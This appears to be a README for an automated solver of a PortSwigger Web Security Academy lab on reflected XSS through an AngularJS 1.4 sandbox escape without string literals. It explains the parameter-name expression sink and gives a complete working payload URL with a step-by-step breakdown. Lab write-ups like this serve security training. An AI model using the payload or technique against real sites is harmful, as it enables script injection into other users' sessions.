# Reflected XSS with AngularJS sandbox escape without strings (EXPERT)

PortSwigger Web Security Academy — client-side template injection.

Lab: <https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings>

## Objective

Escape the AngularJS 1.4 sandbox and execute `alert` **without** using the
`$eval` function and **without** using any string literals.

## What the lab does

`GET /?search=x` renders every query parameter into a controller as
JavaScript, one statement per parameter:

```html
<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'x';
    $scope.value = $parse(key)($scope.query);   // sink
});</script>
```

The parameter **name** is HTML-escaped and single-quoted (so it cannot break the
JS string) but is then compiled by `$parse()` as an AngularJS expression. Query
parameter names are therefore an expression sink — no HTML injection needed.

## Payload

```
/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

* `toString()` builds a string without quotes; `.constructor.prototype.charAt=[].join`
  overwrites `Function.prototype.charAt`, which breaks the sandbox's source check.
* `[1]|orderBy:<string>` makes `orderBy` compile the string as an expression and
  evaluate it per element, running `x=alert(1)` (assembled by `fromCharCode`).
* `%3d` is required: the lab splits a parameter on the first literal `=` and
  decodes afterwards, so the encoded `=` stays inside the expression while the
  final `=1` supplies the value.

## Run

```bash
cd /root/Desktop/PortSwigger_Labs/EXPERT/Reflected-XSS-with-AngularJS-sandbox-escape-without-strings
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"

# or through the universal launcher
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
```

`--show-url` prints the exploit URL for a manual browser check.

## Result

The lab has **no exploit server** (`/exploit` → 404) and is checked
server-side: the crafted request flips the header widget to `is-solved`
(`<p>Solved</p>`), sometimes a few seconds after the request. Exit code 0 is
returned only when that widget reports solved.

See `SOLUTION.md` for the walkthrough, `REPORT.md` for evidence and timings,
`RESUME.md` for the checkpoint, and `LESSONS_LEARNED.md` for the reusable
technique. `evidence/` and `logs/` are local (git-ignored).
